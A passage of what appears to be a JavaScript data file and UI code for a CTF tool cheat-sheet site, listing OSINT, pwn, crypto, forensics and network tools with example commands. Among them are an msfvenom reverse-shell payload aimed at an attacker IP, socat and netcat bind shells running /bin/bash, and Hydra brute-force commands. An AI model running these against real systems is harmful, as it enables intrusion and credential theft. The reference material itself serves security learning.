        name: 'SpiderFoot',
        category: 'osint',
        icon: 'fas fa-spider',
        difficulty: 'intermediate',
        description: 'Automated OSINT tool for reconnaissance and threat intelligence.',
        tags: ['automation', 'intelligence', 'reconnaissance'],
        commands: [
            {
                language: 'bash',
                description: 'Start SpiderFoot web interface',
                code: 'python3 sf.py -l 127.0.0.1:5001'
            },
            {
                language: 'bash',
                description: 'Command line scan',
                code: 'python3 sf.py -s target.com -t IP_ADDRESS'
            }
        ],
        usage: 'Comprehensive OSINT gathering with web interface and automation.',
        tips: [
            'Configure API keys for better data',
            'Use web interface for visual analysis',
            'Export results for further processing'
        ]
    },
    {
        id: 'maltego',
        name: 'Maltego',
        category: 'osint',
        icon: 'fas fa-project-diagram',
        difficulty: 'advanced',
        description: 'Link analysis tool for gathering and connecting information about targets.',
        tags: ['visualization', 'link-analysis', 'investigation'],
        commands: [
            {
                language: 'bash',
                description: 'Launch Maltego',
                code: 'maltego'
            }
        ],
        usage: 'Visual investigation platform for mapping relationships and connections.',
        tips: [
            'Use transforms to gather related data',
            'Create visual maps of target infrastructure',
            'Combine multiple data sources'
        ]
    },
    {
        id: 'osrframework',
        name: 'OSRFramework',
        category: 'osint',
        icon: 'fas fa-users',
        difficulty: 'intermediate',
        description: 'Set of tools for username enumeration and social network investigation.',
        tags: ['username', 'social-media', 'enumeration'],
        commands: [
            {
                language: 'bash',
                description: 'Search username across platforms',
                code: 'usufy -n username'
            },
            {
                language: 'bash',
                description: 'Search multiple usernames',
                code: 'usufy -n username1 username2 -p twitter facebook'
            },
            {
                language: 'bash',
                description: 'Email enumeration',
                code: 'mailfy -n username'
            }
        ],
        usage: 'Enumerate usernames across social networks and verify email addresses.',
        tips: [
            'Check multiple username variations',
            'Use with other OSINT tools for complete picture',
            'Verify results manually'
        ]
    },
    
    // Additional Misc Tools
    {
        id: 'netdiscover',
        name: 'Netdiscover',
        category: 'misc',
        icon: 'fas fa-wifi',
        difficulty: 'beginner',
        description: 'Network discovery tool that passively detects live hosts on a network.',
        tags: ['network', 'discovery', 'passive'],
        commands: [
            {
                language: 'bash',
                description: 'Passive discovery on interface',
                code: 'netdiscover -i eth0'
            },
            {
                language: 'bash',
                description: 'Active scan of range',
                code: 'netdiscover -r 192.168.1.0/24'
            },
            {
                language: 'bash',
                description: 'Fast scan mode',
                code: 'netdiscover -f -r 192.168.1.0/24'
            }
        ],
        usage: 'Discover live hosts on network segments without active probing.',
        tips: [
            'More stealthy than active scanning',
            'Good for initial network reconnaissance',
            'Monitor for new devices joining network'
        ]
    },
    {
        id: 'masscan',
        name: 'Masscan',
        category: 'misc',
        icon: 'fas fa-tachometer-alt',
        difficulty: 'intermediate',
        description: 'High-speed port scanner capable of scanning the entire Internet.',
        tags: ['port-scanner', 'fast', 'large-scale'],
        commands: [
            {
                language: 'bash',
                description: 'Fast port scan',
                code: 'masscan -p80,443 192.168.1.0/24 --rate=1000'
            },
            {
                language: 'bash',
                description: 'Scan all ports',
                code: 'masscan -p1-65535 target.com --rate=10000'
            },
            {
                language: 'bash',
                description: 'Save results to file',
                code: 'masscan -p80,443 192.168.1.0/24 -oG results.txt'
            }
        ],
        usage: 'Extremely fast port scanning for large networks and ranges.',
        tips: [
            'Much faster than nmap for large scans',
            'Use appropriate rate limits',
            'Good for initial port discovery'
        ]
    },
    {
        id: 'searchsploit',
        name: 'Searchsploit',
        category: 'misc',
        icon: 'fas fa-search',
        difficulty: 'beginner',
        description: 'Command-line search tool for Exploit Database.',
        tags: ['exploits', 'vulnerabilities', 'database'],
        commands: [
            {
                language: 'bash',
                description: 'Search for exploits',
                code: 'searchsploit apache 2.4'
            },
            {
                language: 'bash',
                description: 'Mirror and examine exploit',
                code: 'searchsploit -m exploits/linux/remote/12345.py'
            },
            {
                language: 'bash',
                description: 'Update database',
                code: 'searchsploit -u'
            },
            {
                language: 'bash',
                description: 'Search by CVE',
                code: 'searchsploit CVE-2021-44228'
            }
        ],
        usage: 'Find known exploits for discovered vulnerabilities and services.',
        tips: [
            'Always update database before searching',
            'Use specific version numbers for better results',
            'Examine exploit code before using'
        ]
    },
    {
        id: 'metasploit',
        name: 'Metasploit Framework',
        category: 'misc',
        icon: 'fas fa-rocket',
        difficulty: 'advanced',
        description: 'Comprehensive exploitation framework with extensive exploit database.',
        tags: ['exploitation', 'framework', 'payloads'],
        commands: [
            {
                language: 'bash',
                description: 'Start Metasploit console',
                code: 'msfconsole'
            },
            {
                language: 'metasploit',
                description: 'Search for exploits',
                code: 'search type:exploit platform:linux'
            },
            {
                language: 'metasploit',
                description: 'Use exploit module',
                code: 'use exploit/linux/ssh/libssh_auth_bypass\nset RHOSTS target.com\nrun'
            },
            {
                language: 'bash',
                description: 'Generate payload with msfvenom',
                code: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > shell'
            }
        ],
        usage: 'Professional exploitation framework for penetration testing and CTFs.',
        tips: [
            'Use msfvenom for payload generation',
            'Combine with other reconnaissance tools',
            'Learn post-exploitation modules'
        ]
    },
    {
        id: 'hydra',
        name: 'Hydra',
        category: 'misc',
        icon: 'fas fa-key',
        difficulty: 'intermediate',
        description: 'Fast network logon cracker supporting many protocols.',
        tags: ['brute-force', 'login', 'credentials'],
        commands: [
            {
                language: 'bash',
                description: 'Brute force SSH',
                code: 'hydra -l admin -P passwords.txt ssh://target.com'
            },
            {
                language: 'bash',
                description: 'HTTP POST form attack',
                code: 'hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"'
            },
            {
                language: 'bash',
                description: 'FTP brute force',
                code: 'hydra -L users.txt -P passwords.txt ftp://target.com'
            }
        ],
        usage: 'Brute force login credentials for various network services.',
        tips: [
            'Use good wordlists for better success',
            'Respect rate limiting to avoid detection',
            'Combine with username enumeration'
        ]
    },
    {
        id: 'enum4linux',
        name: 'enum4linux',
        category: 'misc',
        icon: 'fas fa-list',
        difficulty: 'beginner',
        description: 'Tool for enumerating information from Windows and Samba systems.',
        tags: ['enumeration', 'windows', 'samba'],
        commands: [
            {
                language: 'bash',
                description: 'Full enumeration',
                code: 'enum4linux -a target.com'
            },
            {
                language: 'bash',
                description: 'User enumeration only',
                code: 'enum4linux -U target.com'
            },
            {
                language: 'bash',
                description: 'Share enumeration',
                code: 'enum4linux -S target.com'
            }
        ],
        usage: 'Enumerate users, shares, and system information from SMB services.',
        tips: [
            'Great for Windows domain enumeration',
            'Check for null session access',
            'Combine with SMB client tools'
        ]
    },
    
    // More PWN Tools
    {
        id: 'strace',
        name: 'strace',
        category: 'pwn',
        icon: 'fas fa-microscope',
        difficulty: 'beginner',
        description: 'System call tracer for debugging and analyzing program execution.',
        tags: ['syscalls', 'debugging', 'tracing'],
        commands: [
            {
                language: 'bash',
                description: 'Trace system calls',
                code: 'strace ./binary'
            },
            {
                language: 'bash',
                description: 'Trace specific syscalls',
                code: 'strace -e trace=read,write,open ./binary'
            },
            {
                language: 'bash',
                description: 'Follow child processes',
                code: 'strace -f ./binary'
            },
            {
                language: 'bash',
                description: 'Save trace to file',
                code: 'strace -o trace.log ./binary'
            }
        ],
        usage: 'Monitor system calls to understand program behavior and find hidden flags.',
        tips: [
            'Look for file operations that might reveal flags',
            'Check for network connections or socket operations',
            'Monitor memory allocation patterns'
        ]
    },
    {
        id: 'ret2libc',
        name: 'ret2libc Tools',
        category: 'pwn',
        icon: 'fas fa-exchange-alt',
        difficulty: 'advanced',
        description: 'Tools and techniques for return-to-libc exploitation.',
        tags: ['ret2libc', 'libc', 'exploitation'],
        commands: [
            {
                language: 'bash',
                description: 'Find libc base address',
                code: 'ldd ./binary | grep libc'
            },
            {
                language: 'bash',
                description: 'Extract strings from libc',
                code: 'strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"'
            },
            {
                language: 'python',
                description: 'Calculate libc addresses',
                code: 'from pwn import *\nlibc = ELF("/lib/x86_64-linux-gnu/libc.so.6")\nsystem_addr = libc.symbols["system"]\nbinsh_addr = next(libc.search(b"/bin/sh"))'
            }
        ],
        usage: 'Exploit buffer overflows using existing libc functions.',
        tips: [
            'Use libc database to identify version',
            'Find system() and /bin/sh addresses',
            'Chain ROP gadgets for parameter passing'
        ]
    },
    {
        id: 'pattern',
        name: 'Pattern Tools',
        category: 'pwn',
        icon: 'fas fa-puzzle-piece',
        difficulty: 'beginner',
        description: 'Generate and analyze patterns for buffer overflow exploitation.',
        tags: ['pattern', 'offset', 'buffer-overflow'],
        commands: [
            {
                language: 'bash',
                description: 'Generate pattern with gdb-peda',
                code: 'gdb -q ./binary\ngdb-peda$ pattern create 100'
            },
            {
                language: 'bash',
                description: 'Find offset with gdb-peda',
                code: 'gdb-peda$ pattern offset $rip'
            },
            {
                language: 'bash',
                description: 'Generate pattern with msf',
                code: '/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100'
            },
            {
                language: 'bash',
                description: 'Find offset with msf',
                code: '/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41414141'
            }
        ],
        usage: 'Create unique patterns to find exact buffer overflow offsets.',
        tips: [
            'Use different pattern generators for verification',
            'Check registers and stack for pattern values',
            'Verify offset with different input sizes'
        ]
    },
    {
        id: 'gdbserver',
        name: 'GDB Server',
        category: 'pwn',
        icon: 'fas fa-server',
        difficulty: 'intermediate',
        description: 'Remote debugging with GDB server for binary analysis.',
        tags: ['remote', 'debugging', 'gdb'],
        commands: [
            {
                language: 'bash',
                description: 'Start gdbserver',
                code: 'gdbserver :1234 ./binary'
            },
            {
                language: 'bash',
                description: 'Connect from gdb',
                code: 'gdb ./binary\n(gdb) target remote localhost:1234'
            },
            {
                language: 'bash',
                description: 'Attach to running process',
                code: 'gdbserver :1234 --attach $(pidof binary)'
            }
        ],
        usage: 'Debug remote binaries or processes that cannot be debugged locally.',
        tips: [
            'Useful for debugging in containers',
            'Can debug processes with different architectures',
            'Good for analyzing network services'
        ]
    },
    
    // More Crypto Tools
    {
        id: 'yafu',
        name: 'YAFU',
        category: 'crypto',
        icon: 'fas fa-divide',
        difficulty: 'advanced',
        description: 'Yet Another Factoring Utility for integer factorization.',
        tags: ['factorization', 'rsa', 'integers'],
        commands: [
            {
                language: 'bash',
                description: 'Factor a number',
                code: 'yafu "factor(123456789)"'
            },
            {
                language: 'bash',
                description: 'Use specific algorithm',
                code: 'yafu "qs(123456789)"'
            },
            {
                language: 'bash',
                description: 'Factor from file',
                code: 'yafu -B "factor(@)" < numbers.txt'
            }
        ],
        usage: 'Factor large integers for RSA key attacks and cryptographic challenges.',
        tips: [
            'More powerful than basic factorization tools',
            'Try different algorithms for different number sizes',
            'Good for CTF RSA challenges'
        ]
    },
    {
        id: 'openssl-crypto',
        name: 'OpenSSL Crypto',
        category: 'crypto',
        icon: 'fas fa-lock',
        difficulty: 'intermediate',
        description: 'OpenSSL command-line cryptographic operations.',
        tags: ['encryption', 'decryption', 'certificates'],
        commands: [
            {
                language: 'bash',
                description: 'Generate RSA key pair',
                code: 'openssl genrsa -out private.pem 2048\nopenssl rsa -in private.pem -pubout -out public.pem'
            },
            {
                language: 'bash',
                description: 'Encrypt with RSA public key',
                code: 'openssl rsautl -encrypt -pubin -inkey public.pem -in flag.txt -out encrypted.bin'
            },
            {
                language: 'bash',
                description: 'Decrypt with RSA private key',
                code: 'openssl rsautl -decrypt -inkey private.pem -in encrypted.bin'
            },
            {
                language: 'bash',
                description: 'Base64 encode/decode',
                code: 'echo "secret" | openssl base64\necho "c2VjcmV0" | openssl base64 -d'
            },
            {
                language: 'bash',
                description: 'AES encryption/decryption',
                code: 'openssl enc -aes-256-cbc -in flag.txt -out encrypted.bin -k password\nopenssl enc -aes-256-cbc -d -in encrypted.bin -k password'
            }
        ],
        usage: 'Perform various cryptographic operations and analyze certificates.',
        tips: [
            'Extract public key from certificate',
            'Try different encryption modes',
            'Use for padding oracle attacks'
        ]
    },
    {
        id: 'gmpy2',
        name: 'gmpy2',
        category: 'crypto',
        icon: 'fab fa-python',
        difficulty: 'intermediate',
        description: 'Python library for multiple-precision arithmetic and cryptographic calculations.',
        tags: ['python', 'arithmetic', 'modular'],
        commands: [
            {
                language: 'python',
                description: 'RSA key generation and operations',
                code: 'import gmpy2\n# Generate prime\np = gmpy2.next_prime(2**512)\n# Modular inverse\nd = gmpy2.invert(e, (p-1)*(q-1))\n# Fast exponentiation\nresult = gmpy2.powmod(c, d, n)'
            },
            {
                language: 'python',
                description: 'GCD and extended GCD',
                code: 'import gmpy2\ngcd = gmpy2.gcd(a, b)\n# Extended GCD for modular inverse\nx, y, g = gmpy2.gcdext(a, b)'
            },
            {
                language: 'python',
                description: 'Integer square root',
                code: 'import gmpy2\nsqrt_n = gmpy2.isqrt(n)\n# Check if perfect square\nif sqrt_n * sqrt_n == n:\n    print("Perfect square!")'
            }
        ],
        usage: 'Perform high-precision arithmetic for cryptographic attacks.',
        tips: [
            'Faster than built-in Python for large numbers',
            'Essential for RSA attacks',
            'Good for modular arithmetic operations'
        ]
    },
    {
        id: 'xortool',
        name: 'XORtool',
        category: 'crypto',
        icon: 'fas fa-exchange-alt',
        difficulty: 'beginner',
        description: 'Tool for analyzing and breaking XOR ciphers.',
        tags: ['xor', 'analysis', 'breaking'],
        commands: [
            {
                language: 'bash',
                description: 'Analyze XOR encrypted data',
                code: 'xortool encrypted_data'
            },
            {
                language: 'bash',
                description: 'Specify known plaintext',
                code: 'xortool -l 4 -c 20 encrypted_data'
            },
            {
                language: 'bash',
                description: 'Brute force key length',
                code: 'xortool-xor -s "the " encrypted_data'
            }
        ],
        usage: 'Break XOR encryption by analyzing patterns and key lengths.',
        tips: [
            'Look for common English words',
            'Try different key lengths',
            'Use frequency analysis for single-byte XOR'
        ]
    },
    {
        id: 'pkcrack',
        name: 'pkcrack',
        category: 'crypto',
        icon: 'fas fa-file-archive',
        difficulty: 'advanced',
        description: 'Tool for breaking ZIP encryption using known plaintext attacks.',
        tags: ['zip', 'pkware', 'known-plaintext'],
        commands: [
            {
                language: 'bash',
                description: 'Extract encryption info',
                code: 'zipdump.py encrypted.zip'
            },
            {
                language: 'bash',
                description: 'Known plaintext attack',
                code: 'pkcrack -C encrypted.zip -c filename.txt -P plaintext.zip -p filename.txt'
            },
            {
                language: 'bash',
                description: 'Extract with found keys',
                code: 'pkcrack -C encrypted.zip -c filename.txt -k key1 key2 key3'
            }
        ],
        usage: 'Break old ZIP encryption when you have known plaintext.',
        tips: [
            'Need at least 12 bytes of known plaintext',
            'Works on PKZip traditional encryption',
            'Look for common files like readme.txt'
        ]
    },
    
    // More Forensics Tools
    {
        id: 'photorec',
        name: 'PhotoRec',
        category: 'forensics',
        icon: 'fas fa-camera',
        difficulty: 'beginner',
        description: 'File carving tool to recover deleted files from storage media.',
        tags: ['recovery', 'carving', 'deleted-files'],
        commands: [
            {
                language: 'bash',
                description: 'Start PhotoRec',
                code: 'photorec'
            },
            {
                language: 'bash',
                description: 'Command line recovery',
                code: 'photorec_static /log /dev/sdb1'
            },
            {
                language: 'bash',
                description: 'Recover specific file types',
                code: 'photorec /cmd /dev/sdb1 search'
            }
        ],
        usage: 'Recover deleted files from disk images and storage devices.',
        tips: [
            'Works on many file systems',
            'Can recover even from damaged filesystems',
            'Check all recovered files for flags'
        ]
    },
    {
        id: 'bulk-extractor',
        name: 'bulk_extractor',
        category: 'forensics',
        icon: 'fas fa-search',
        difficulty: 'intermediate',
        description: 'Digital forensics tool for extracting features from disk images.',
        tags: ['extraction', 'features', 'forensics'],
        commands: [
            {
                language: 'bash',
                description: 'Extract features from image',
                code: 'bulk_extractor -o output_dir disk.img'
            },
            {
                language: 'bash',
                description: 'Extract only specific features',
                code: 'bulk_extractor -x all -e email -e url -o output_dir disk.img'
            },
            {
                language: 'bash',
                description: 'Process memory dump',
                code: 'bulk_extractor -S ssn_mode=1 -o output_dir memory.dump'
            }
        ],
        usage: 'Extract emails, URLs, credit cards, and other data from disk images.',
        tips: [
            'Check email.txt for email addresses',
            'Look in url.txt for web addresses',
            'Search ccn.txt for credit card numbers'
        ]
    },
    {
        id: 'volatility3',
        name: 'Volatility 3',
        category: 'forensics',
        icon: 'fas fa-memory',
        difficulty: 'advanced',
        description: 'Next generation memory forensics framework.',
        tags: ['memory', 'forensics', 'analysis'],
        commands: [
            {
                language: 'bash',
                description: 'List available plugins',
                code: 'python3 vol.py -h'
            },
            {
                language: 'bash',
                description: 'Windows process list',
                code: 'python3 vol.py -f memory.dump windows.pslist'
            },
            {
                language: 'bash',
                description: 'Network connections',
                code: 'python3 vol.py -f memory.dump windows.netstat'
            },
            {
                language: 'bash',
                description: 'Command history',
                code: 'python3 vol.py -f memory.dump windows.cmdline'
            },
            {
                language: 'bash',
                description: 'File scan',
                code: 'python3 vol.py -f memory.dump windows.filescan | grep flag'
            }
        ],
        usage: 'Analyze memory dumps for processes, network connections, and artifacts.',
        tips: [
            'No need to specify profile like in Volatility 2',
            'Check command line arguments for flags',
            'Look for suspicious processes and network activity'
        ]
    },
    {
        id: 'sleuthkit',
        name: 'The Sleuth Kit',
        category: 'forensics',
        icon: 'fas fa-search-plus',
        difficulty: 'intermediate',
        description: 'Collection of command-line digital forensics tools.',
        tags: ['filesystem', 'analysis', 'timeline'],
        commands: [
            {
                language: 'bash',
                description: 'List files in filesystem',
                code: 'fls -r -m / disk.img'
            },
            {
                language: 'bash',
                description: 'Extract file by inode',
                code: 'icat disk.img 1234 > extracted_file'
            },
            {
                language: 'bash',
                description: 'Show filesystem info',
                code: 'fsstat disk.img'
            },
            {
                language: 'bash',
                description: 'Create timeline',
                code: 'fls -r -m / disk.img > bodyfile\nmactime -b bodyfile -d > timeline.csv'
            },
            {
                language: 'bash',
                description: 'Search for deleted files',
                code: 'fls -d disk.img'
            }
        ],
        usage: 'Analyze filesystem structures and recover deleted files.',
        tips: [
            'Use timeline analysis to understand file activity',
            'Check deleted files for flags',
            'Look at file metadata for clues'
        ]
    },
    {
        id: 'dd-forensics',
        name: 'DD Forensics',
        category: 'forensics',
        icon: 'fas fa-copy',
        difficulty: 'beginner',
        description: 'Disk imaging and data extraction using dd and related tools.',
        tags: ['imaging', 'extraction', 'disk'],
        commands: [
            {
                language: 'bash',
                description: 'Create disk image',
                code: 'dd if=/dev/sdb of=disk.img bs=1M status=progress'
            },
            {
                language: 'bash',
                description: 'Extract specific bytes',
                code: 'dd if=disk.img skip=1000 count=100 bs=1 of=extracted.bin'
            },
            {
                language: 'bash',
                description: 'Convert and extract',
                code: 'dd if=disk.img of=output.txt conv=ascii'
            },
            {
                language: 'bash',
                description: 'Find pattern in disk',
                code: 'grep -abo "flag{" disk.img'
            }
        ],
        usage: 'Create forensic images and extract specific data from disks.',
        tips: [
            'Always work with copies, not original evidence',
            'Use skip and count to extract specific sectors',
            'Combine with hexdump for analysis'
        ]
    },
    
    // More Reverse Engineering Tools
    {
        id: 'objdump',
        name: 'objdump',
        category: 'reverse',
        icon: 'fas fa-file-code',
        difficulty: 'beginner',
        description: 'Display information about object files and disassemble binaries.',
        tags: ['disassembly', 'analysis', 'object-files'],
        commands: [
            {
                language: 'bash',
                description: 'Disassemble binary',
                code: 'objdump -d binary'
            },
            {
                language: 'bash',
                description: 'Show headers',
                code: 'objdump -h binary'
            },
            {
                language: 'bash',
                description: 'Show symbols',
                code: 'objdump -t binary'
            },
            {
                language: 'bash',
                description: 'Disassemble specific section',
                code: 'objdump -d -j .text binary'
            },
            {
                language: 'bash',
                description: 'Show source code with assembly',
                code: 'objdump -S binary'
            }
        ],
        usage: 'Quick disassembly and analysis of compiled binaries.',
        tips: [
            'Look for interesting function names',
            'Check string references',
            'Analyze program structure'
        ]
    },
    {
        id: 'readelf',
        name: 'readelf',
        category: 'reverse',
        icon: 'fas fa-file-alt',
        difficulty: 'beginner',
        description: 'Display information about ELF files.',
        tags: ['elf', 'headers', 'analysis'],
        commands: [
            {
                language: 'bash',
                description: 'Show ELF header',
                code: 'readelf -h binary'
            },
            {
                language: 'bash',
                description: 'Show section headers',
                code: 'readelf -S binary'
            },
            {
                language: 'bash',
                description: 'Show symbol table',
                code: 'readelf -s binary'
            },
            {
                language: 'bash',
                description: 'Show program headers',
                code: 'readelf -l binary'
            },
            {
                language: 'bash',
                description: 'Show dynamic section',
                code: 'readelf -d binary'
            }
        ],
        usage: 'Analyze ELF file structure and extract metadata.',
        tips: [
            'Check for custom sections that might contain flags',
            'Look at imported/exported functions',
            'Analyze program entry point'
        ]
    },
    {
        id: 'hexdump',
        name: 'hexdump/xxd',
        category: 'reverse',
        icon: 'fas fa-hashtag',
        difficulty: 'beginner',
        description: 'Hex dump tools for examining binary files.',
        tags: ['hex', 'binary', 'analysis'],
        commands: [
            {
                language: 'bash',
                description: 'Hex dump with xxd',
                code: 'xxd binary'
            },
            {
                language: 'bash',
                description: 'Canonical hex dump',
                code: 'hexdump -C binary'
            },
            {
                language: 'bash',
                description: 'Search for pattern',
                code: 'xxd binary | grep flag'
            },
            {
                language: 'bash',
                description: 'Show specific offset',
                code: 'xxd -s 0x1000 -l 256 binary'
            },
            {
                language: 'bash',
                description: 'Reverse hex to binary',
                code: 'xxd -r -p hexfile.txt > binary'
            }
        ],
        usage: 'Examine binary files in hexadecimal format.',
        tips: [
            'Look for ASCII strings in hex dumps',
            'Check file headers and magic bytes',
            'Search for flag patterns'
        ]
    },
    {
        id: 'nm',
        name: 'nm',
        category: 'reverse',
        icon: 'fas fa-list',
        difficulty: 'beginner',
        description: 'List symbols from object files.',
        tags: ['symbols', 'functions', 'analysis'],
        commands: [
            {
                language: 'bash',
                description: 'List all symbols',
                code: 'nm binary'
            },
            {
                language: 'bash',
                description: 'List undefined symbols',
                code: 'nm -u binary'
            },
            {
                language: 'bash',
                description: 'List dynamic symbols',
                code: 'nm -D binary'
            },
            {
                language: 'bash',
                description: 'Sort by address',
                code: 'nm -n binary'
            },
            {
                language: 'bash',
                description: 'Demangle C++ symbols',
                code: 'nm -C binary'
            }
        ],
        usage: 'Identify function names and symbols in binaries.',
        tips: [
            'Look for suspicious function names',
            'Check for hidden or debug symbols',
            'Identify key functions for analysis'
        ]
    },
    {
        id: 'file-analysis',
        name: 'file',
        category: 'reverse',
        icon: 'fas fa-file-medical',
        difficulty: 'beginner',
        description: 'Determine file type and characteristics.',
        tags: ['file-type', 'identification', 'analysis'],
        commands: [
            {
                language: 'bash',
                description: 'Identify file type',
                code: 'file binary'
            },
            {
                language: 'bash',
                description: 'Show MIME type',
                code: 'file -i binary'
            },
            {
                language: 'bash',
                description: 'Force file type check',
                code: 'file -f filelist.txt'
            },
            {
                language: 'bash',
                description: 'Check multiple files',
                code: 'file *'
            }
        ],
        usage: 'Quickly identify file types and formats.',
        tips: [
            'First step in any file analysis',
            'Can detect packed or obfuscated files',
            'Look for unusual or custom file types'
        ]
    },
    
    // More Misc Tools
    {
        id: 'socat',
        name: 'socat',
        category: 'misc',
        icon: 'fas fa-link',
        difficulty: 'intermediate',
        description: 'Multipurpose network tool for creating connections and tunnels.',
        tags: ['network', 'tunnel', 'connection'],
        commands: [
            {
                language: 'bash',
                description: 'TCP listener',
                code: 'socat TCP-LISTEN:8080,fork EXEC:/bin/bash'
            },
            {
                language: 'bash',
                description: 'Connect to remote service',
                code: 'socat - TCP:target.com:1234'
            },
            {
                language: 'bash',
                description: 'Port forwarding',
                code: 'socat TCP-LISTEN:8080,fork TCP:internal.server:80'
            },
            {
                language: 'bash',
                description: 'File transfer',
                code: 'socat -u FILE:data.txt TCP:target.com:1234'
            }
        ],
        usage: 'Create network connections, tunnels, and transfer data.',
        tips: [
            'More powerful than netcat',
            'Can handle SSL/TLS connections',
            'Good for creating reverse shells'
        ]
    },
    {
        id: 'tcpdump',
        name: 'tcpdump',
        category: 'misc',
        icon: 'fas fa-network-wired',
        difficulty: 'intermediate',
        description: 'Command-line packet analyzer for network traffic capture.',
        tags: ['network', 'packet-capture', 'analysis'],
        commands: [
            {
                language: 'bash',
                description: 'Capture packets on interface',
                code: 'tcpdump -i eth0'
            },
            {
                language: 'bash',
                description: 'Capture to file',
                code: 'tcpdump -i eth0 -w capture.pcap'
            },
            {
                language: 'bash',
                description: 'Filter by port',
                code: 'tcpdump -i eth0 port 80'
            },
            {
                language: 'bash',
                description: 'Show packet contents',
                code: 'tcpdump -i eth0 -X'
            },
            {
                language: 'bash',
                description: 'Read from file',
                code: 'tcpdump -r capture.pcap'
            }
        ],
        usage: 'Capture and analyze network traffic for forensics and debugging.',
        tips: [
            'Look for credentials in cleartext protocols',
            'Check for unusual traffic patterns',
            'Filter by specific hosts or protocols'
        ]
    },
    {
        id: 'nc-advanced',
        name: 'Netcat Advanced',
        category: 'misc',
        icon: 'fas fa-terminal',
        difficulty: 'intermediate',
        description: 'Advanced netcat usage for various network operations.',
        tags: ['netcat', 'network', 'connection'],
        commands: [
            {
                language: 'bash',
                description: 'Banner grabbing',
                code: 'nc -nv target.com 80'
            },
            {
                language: 'bash',
                description: 'Port scanning',
                code: 'nc -nv -z target.com 1-1000'
            },
            {
                language: 'bash',
                description: 'File transfer (sender)',
                code: 'nc -l -p 1234 < file.txt'
            },
            {
                language: 'bash',
                description: 'File transfer (receiver)',
                code: 'nc target.com 1234 > received_file.txt'
            },
            {
                language: 'bash',
                description: 'Bind shell',
                code: 'nc -l -p 1234 -e /bin/bash'
            }
        ],
        usage: 'Network Swiss Army knife for various connection tasks.',
        tips: [
            'Great for quick network testing',
            'Can create simple backdoors',
            'Useful for CTF network challenges'
        ]
    },
    {
        id: 'base64-tools',
        name: 'Base64 Tools',
        category: 'misc',
        icon: 'fas fa-code',
        difficulty: 'beginner',
        description: 'Various tools for base64 encoding and decoding operations.',
        tags: ['encoding', 'decoding', 'base64'],
        commands: [
            {
                language: 'bash',
                description: 'Encode string',
                code: 'echo "flag{hidden}" | base64'
            },
            {
                language: 'bash',
                description: 'Decode string',
                code: 'echo "ZmxhZ3toaWRkZW59" | base64 -d'
            },
            {
                language: 'bash',
                description: 'Encode file',
                code: 'base64 file.txt > encoded.b64'
            },
            {
                language: 'bash',
                description: 'Decode file',
                code: 'base64 -d encoded.b64 > decoded.txt'
            },
            {
                language: 'python',
                description: 'Multiple rounds of decoding',
                code: 'import base64\ndata = "encoded_string"\nfor i in range(10):\n    try:\n        data = base64.b64decode(data).decode()\n        print(f"Round {i}: {data}")\n    except:\n        break'
            }
        ],
        usage: 'Handle base64 encoded data commonly found in CTF challenges.',
        tips: [
            'Try multiple rounds of decoding',
            'Look for base64 patterns in source code',
            'Check for URL-safe base64 variants'
        ]
    },
    {
        id: 'curl-advanced',
        name: 'cURL Advanced',
        category: 'misc',
        icon: 'fas fa-download',
        difficulty: 'intermediate',
        description: 'Advanced cURL usage for web requests and API interactions.',
        tags: ['http', 'api', 'requests'],
        commands: [
            {
                language: 'bash',
                description: 'POST data with headers',
                code: 'curl -X POST -H "Content-Type: application/json" -d \'{"key":"value"}\' http://target.com/api'
            },
            {
                language: 'bash',
                description: 'Follow redirects',
                code: 'curl -L http://target.com'
            },
            {
                language: 'bash',
                description: 'Save cookies',
                code: 'curl -c cookies.txt -b cookies.txt http://target.com'
            },
            {
                language: 'bash',
                description: 'Custom user agent',
                code: 'curl -A "Custom-Agent/1.0" http://target.com'
            },
            {
                language: 'bash',
                description: 'Download file with progress',
                code: 'curl -o file.zip -# http://target.com/file.zip'
            }
        ],
        usage: 'Make complex HTTP requests for web application testing.',
        tips: [
            'Use verbose mode (-v) for debugging',
            'Save and reuse session cookies',
            'Check response headers for clues'
        ]
    }
];

// Application State
let currentCategory = 'all';
let currentDifficulty = '';
let searchTerm = '';
let favoriteTools = JSON.parse(localStorage.getItem('ctf-favorites') || '[]');
let currentTheme = localStorage.getItem('ctf-theme') || 'dark';

// DOM Elements
const loadingScreen = document.getElementById('loading-screen');
const searchInput = document.getElementById('search-input');
const clearSearchBtn = document.getElementById('clear-search');
const categoryFilter = document.getElementById('category-filter');
const difficultyFilter = document.getElementById('difficulty-filter');
const toolsContainer = document.getElementById('tools-container');
const noResults = document.getElementById('no-results');
const categoryNavBtns = document.querySelectorAll('.nav-btn');
const themeToggle = document.getElementById('theme-toggle');
const modal = document.getElementById('tool-modal');
const modalTitle = document.getElementById('modal-title');
const modalContent = document.getElementById('modal-content');
const favoritesToggle = document.getElementById('favorites-toggle');
const favoritesCount = document.querySelector('.favorites-count');
const favoritesList = document.getElementById('favorites-list');
const toastContainer = document.getElementById('toast-container');

// Initialize Application
document.addEventListener('DOMContentLoaded', () => {
    initializeTheme();
    setupEventListeners();
    renderTools();
    updateFavoritesDisplay();
    hideLoadingScreen();
});

// Theme Management
function initializeTheme() {
    document.documentElement.setAttribute('data-theme', currentTheme);
    const icon = themeToggle.querySelector('i');
    icon.className = currentTheme === 'dark' ? 'fas fa-moon' : 'fas fa-sun';
}

function toggleTheme() {
    currentTheme = currentTheme === 'dark' ? 'light' : 'dark';
    document.documentElement.setAttribute('data-theme', currentTheme);
    localStorage.setItem('ctf-theme', currentTheme);
    
    const icon = themeToggle.querySelector('i');
    icon.className = currentTheme === 'dark' ? 'fas fa-moon' : 'fas fa-sun';
    
    showToast('Theme switched to ' + currentTheme + ' mode', 'success');
}

// Event Listeners
function setupEventListeners() {
    // Search functionality
    searchInput.addEventListener('input', (e) => {
        searchTerm = e.target.value.toLowerCase();
        renderTools();
        toggleClearButton();
    });
    
    clearSearchBtn.addEventListener('click', () => {
        searchInput.value = '';
        searchTerm = '';
        renderTools();
        toggleClearButton();
    });
    
    // Filters
    categoryFilter.addEventListener('change', (e) => {
        setActiveCategory(e.target.value || 'all');
    });
    
    difficultyFilter.addEventListener('change', (e) => {
        currentDifficulty = e.target.value;
        renderTools();
    });
    
    // Category navigation
